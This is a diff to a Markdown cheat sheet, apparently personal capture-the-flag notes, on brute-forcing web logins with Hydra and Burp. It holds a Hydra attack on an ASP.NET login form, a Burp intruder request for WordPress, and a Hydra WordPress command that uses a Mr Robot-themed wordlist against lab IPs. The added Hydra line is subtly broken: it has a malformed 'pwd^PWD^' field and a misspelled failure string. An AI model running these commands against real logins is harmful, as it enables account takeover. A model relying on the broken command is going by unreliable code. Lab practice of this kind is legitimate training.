@@ -26,5 +26,19 @@ hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.13.215 http-form-post "/Account/login.aspx?ReturnURL=admin:__VIEWSTATE=Q3C6t5UR5WbecqI6RxFVaHu2Jtr1TdsBm55dod6%2BSIHxT0kxMBXn8wPbUnML9Vy9uRcSdloliGhTiMXdg3L7dnVvby02BPayOuD6c2LVg%2FU1c1yfSmFi5O6NlaTJYr68DyAXNg6D0j2asLCrpbH%2FWtzIy%2BZc3SUPCjeyLjkOGGAvF%2BTu&__EVENTVALIDATION=v4fE3cbsejLdoruZ%2FnmnsQwMup0S0RVxnZgjAleWBCxzueQe6GQdUCeTG2i7uhPOvsZLXXydTOvEA2CVgd1vzxHIeYpzSSUxXjRSmXxYMBjDiqZ%2BE3y8DMbAC4KwudESlYVM2xBlpPHOe5utRfzqUDFKO5Df4kWeOvLVLRLBuTxZAlxu&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" 
 ```
 
+WordPress - Burp
+```php
+POST /wp-login.php HTTP/1.1
+
+Host: 10.10.114.27
+
+log=§admin§&pwd=§admin§&wp-submit=§Log+In§&redirect_to=§https%3A%2F%2F10.10.114.27%2Fwp-admin%2F§&testcookie=§1§
+```
+
+WordPress - Hydra input
+```shell
+hydra -L fsocity.dic -p test 10.10.114.27 http-post-form "/wp-login.php:log=^USER^&pwd^PWD^:Invaild username" -t 30
+
+```
 
 #tools #hydra
